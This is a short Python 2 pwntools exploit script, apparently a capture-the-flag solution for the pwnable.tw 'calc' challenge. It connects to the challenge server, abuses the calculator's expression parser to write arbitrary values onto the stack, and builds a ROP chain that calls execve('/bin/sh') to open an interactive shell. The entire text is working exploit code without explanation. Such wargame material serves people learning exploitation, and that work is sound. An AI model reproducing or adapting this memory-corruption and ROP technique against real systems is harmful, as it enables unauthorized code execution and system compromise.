#!/usr/bin/python2

from pwn import *
first=True

def write_to_mem(stream, offset, val):
    global first
    offset = str(offset)
    stream.sendline("+" + offset)
    if first:
        stream.recvline()
        first=False
    content = int(stream.recvline())
    if content < 0:
        content*=-1
    stream.sendline("+" + offset + "+" + str(val) +  "-" + str(content))
    if (int(stream.recvline()) != val):
        log.info("not written")
        return False
    log.success("value: " + str(val) + " succesfully written")
    return True

def exploit():
    global first
    r = remote("chall.pwnable.tw", 10100)
    r.recvuntil("=== Welcome to SECPROG calculator ===")
    write_to_mem(r, 361, 0x080701aa)
    write_to_mem(r, 362, 0x080ec060)
    write_to_mem(r, 363, 0x0805c34b)
    write_to_mem(r, 364, u32("/bin"))
    write_to_mem(r, 365, 0x0809b30d)
    write_to_mem(r, 366, 0x080701aa)
    write_to_mem(r, 367, 0x080ec064)
    write_to_mem(r, 368, 0x0805c34b)
    write_to_mem(r, 369, u32("/sh\x00"))
    write_to_mem(r, 370, 0x0809b30d)
    write_to_mem(r, 371, 0x080701aa)
    write_to_mem(r, 372, 0x080ec068)
    write_to_mem(r, 373, 0x080550d0)
    write_to_mem(r, 374, 0x0809b30d)
    write_to_mem(r, 375, 0x080481d1)
    write_to_mem(r, 376, 0x080ec060)
    write_to_mem(r, 377, 0x080701d1) 
    write_to_mem(r, 378, 0x080ec068)
    write_to_mem(r, 379, 0x080ec060) 
    write_to_mem(r, 380, 0x080701aa)
    write_to_mem(r, 381, 0x080ec068)
    write_to_mem(r, 382, 0x0805c34b)
    write_to_mem(r, 383, 11)
    write_to_mem(r, 384, 0x08049a21)
    r.interactive()
    
def main():
    exploit()

if __name__=="__main__":
    main()
